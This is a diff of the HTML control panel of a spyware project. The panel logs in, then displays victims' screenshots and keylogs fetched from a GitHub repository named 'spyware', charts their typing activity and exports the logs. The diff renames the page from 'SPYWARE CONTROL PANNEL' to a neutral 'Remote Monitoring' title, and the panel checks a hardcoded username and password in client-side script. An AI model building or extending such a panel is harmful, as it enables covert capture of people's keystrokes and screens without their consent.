@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SPYWARE CONTROL PANNEL</title>
+    <title>Remote Monitoring - Latest Screenshot and Keylogs</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,7 +17,7 @@
             color: #2c3e50;
         }
         img {
-            width: 1200px;
+            width: 400px;
             height: auto;
             margin: 10px;
             border: 2px solid #2980b9;
@@ -78,31 +78,23 @@
             }
         }
 
-        /* Styles for the login form */
+        /* Login Form Styles */
         #login-form {
-            display: none; /* Initially hidden */
+            display: none; /* Hide initially */
             margin-bottom: 20px;
         }
         #login-form input {
-            margin: 10px 0;
             padding: 10px;
-            width: 150px;
+            margin: 5px;
             border: 1px solid #ccc;
             border-radius: 5px;
-        }
-        #login-form button {
-            background-color: #2980b9;
-            color: white;
-            cursor: pointer;
-        }
-        #login-form button:hover {
-            background-color: #1a5b8a;
+            width: 200px;
         }
     </style>
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script> <!-- Include Chart.js -->
 </head>
 <body>
-    <h1>SPYWARE CONTROL PANNEL</h1>
+    <h1>Remote Monitoring - Latest Screenshot and Keylogs</h1>
 
     <!-- Login Form -->
     <div id="login-form">
@@ -112,10 +104,9 @@
         <button onclick="authenticateUser()">Login</button>
     </div>
 
-    <!-- Main content -->
-    <div id="main-content" style="display: none;">
+    <div id="main-content" style="display:none;">
         <button class="toggle-button" onclick="toggleDarkMode()">Toggle Dark Mode</button>
-
+        
         <h2>Latest Screenshot</h2>
         <div id="latest-screenshot">
             <!-- Latest screenshot will be shown here -->
@@ -156,6 +147,7 @@
             <!-- Keylog content will be displayed here -->
             <script>
                 const keylogUrl = "https://raw.githubusercontent.com/shrijaybaheti/spyware/main/logs/keylog.txt";
+                let activityChart; // Declare the activityChart variable outside the function
 
                 function fetchKeylog() {
                     fetch(keylogUrl)
@@ -163,6 +155,11 @@
                         .then(data => {
                             document.getElementById('keylog-content').innerText = data;
                             updateTimer();
+
+                            // Ensure activityChart is initialized before updating it
+                            if (!activityChart) {
+                                initializeActivityChart(); // Call function to initialize the chart
+                            }
                             updateActivityChart(data); // Update the chart with the latest keylog data
                         })
                         .catch(error => logError('Error fetching keylog: ' + error));
@@ -175,50 +172,45 @@
                     document.getElementById('timer').innerText = "Last updated: " + lastUpdateTime.toLocaleTimeString();
                 }
 
-                fetchKeylog(); // Initial fetch
-                setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
+                function initializeActivityChart() {
+                    const ctx = document.createElement('canvas');
+                    ctx.id = 'activityChart';
+                    document.body.appendChild(ctx);
 
-                // Timer display
-                document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
-
-                // Chart for typing activity
-                const ctx = document.createElement('canvas');
-                ctx.id = 'activityChart';
-                document.body.appendChild(ctx);
-                const activityChart = new Chart(ctx, {
-                    type: 'line',
-                    data: {
-                        labels: [], // Timestamps for x-axis
-                        datasets: [{
-                            label: 'Typing Activity',
-                            data: [], // Data points for y-axis
-                            borderColor: 'rgba(75, 192, 192, 1)',
-                            borderWidth: 2,
-                            fill: false,
-                        }]
-                    },
-                    options: {
-                        responsive: true,
-                        scales: {
-                            x: {
-                                type: 'time',
-                                time: {
-                                    unit: 'minute'
+                    activityChart = new Chart(ctx, {
+                        type: 'line',
+                        data: {
+                            labels: [], // Timestamps for x-axis
+                            datasets: [{
+                                label: 'Typing Activity',
+                                data: [], // Data points for y-axis
+                                borderColor: 'rgba(75, 192, 192, 1)',
+                                borderWidth: 2,
+                                fill: false,
+                            }]
+                        },
+                        options: {
+                            responsive: true,
+                            scales: {
+                                x: {
+                                    type: 'time',
+                                    time: {
+                                        unit: 'minute'
+                                    },
+                                    title: {
+                                        display: true,
+                                        text: 'Time'
+                                    }
                                 },
-                                title: {
-                                    display: true,
-                                    text: 'Time'
-                                }
-                            },
-                            y: {
-                                title: {
-                                    display: true,
-                                    text: 'Key Presses'
+                                y: {
+                                    title: {
+                                        display: true,
+                                        text: 'Key Presses'
+                                    }
                                 }
                             }
-                        }
-                    }
-                });
+                        });
+                }
 
                 // Update activity chart based on keylog data
                 function updateActivityChart(keylogData) {
@@ -236,6 +228,12 @@
                     activityChart.data.datasets[0].data = counts;
                     activityChart.update();
                 }
+
+                fetchKeylog(); // Initial fetch
+                setInterval(fetchKeylog, 30000); // Refresh every 30 seconds
+
+                // Timer display
+                document.body.insertAdjacentHTML('beforeend', '<div id="timer">Last updated: </div>');
             </script>
         </div>
 
@@ -271,44 +269,30 @@
                     });
             }
 
-            // Download Logs in JSON format
-            function downloadKeylogJSON() {
-                fetch(keylogUrl)
-                    .then(response => response.text())
-                    .then(data => {
-                        const jsonData = JSON.stringify({ logs: data.split('\n') }, null, 2);
-                        const blob = new Blob([jsonData], { type: 'application/json' });
-                        const url = URL.createObjectURL(blob);
-                        const a = document.createElement('a');
-                        a.href = url;
-                        a.download = 'keylog.json';
-                        a.click();
-                        URL.revokeObjectURL(url);
-                    });
-            }
+            // Add download button
+            const downloadButton = document.createElement('button');
+            downloadButton.classList.add('download-button');
+            downloadButton.innerText = 'Download Keylog as CSV';
+            downloadButton.onclick = downloadKeylogCSV;
+            document.body.appendChild(downloadButton);
         </script>
-
-        <h2>Download Keylogs</h2>
-        <button class="download-button" onclick="downloadKeylogCSV()">Download as CSV</button>
-        <button class="download-button" onclick="downloadKeylogJSON()">Download as JSON</button>
-
     </div>
 
     <script>
-        // Show the login form when the page loads
-        document.getElementById('login-form').style.display = 'block';
+        // Show login form on page load
+        document.getElementById("login-form").style.display = "block";
 
-        // User Authentication
+        // Authenticate user
         function authenticateUser() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
 
-            // Replace with your own user validation logic
+            // Simple username and password check (you can replace this with your own logic)
             if (username === "shrijay_baheti" && password === "shrijay@2007") {
-                document.getElementById('login-form').style.display = 'none';
-                document.getElementById('main-content').style.display = 'block';
+                document.getElementById("login-form").style.display = "none"; // Hide login form
+                document.getElementById("main-content").style.display = "block"; // Show main content
             } else {
-                alert("Invalid credentials. Access denied.");
+                alert("Invalid username or password");
             }
         }
     </script>
